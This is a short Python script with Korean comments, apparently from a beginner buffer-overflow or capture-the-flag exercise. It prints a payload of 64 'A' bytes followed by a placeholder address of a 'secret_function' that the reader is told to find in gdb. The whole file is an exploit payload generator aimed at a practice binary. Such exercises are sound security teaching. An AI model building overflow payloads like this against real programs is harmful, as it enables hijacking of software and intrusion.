import sys
import struct

# 여기 gdb에서 찾은 secret_function의 주소를 입력하세요.
address =  0x11ab # 예시 주소, 자신의 gdb에서 얻은 주소로 바꾸세요!

# 64개의 'A'로 버퍼를 채우고, 그 뒤에 secret_function의 주소를 삽입합니다.
payload = b'A' * 64 + struct.pack('<I', address)

# 페이로드를 표준 출력으로 보냅니다.
sys.stdout.buffer.write(payload)
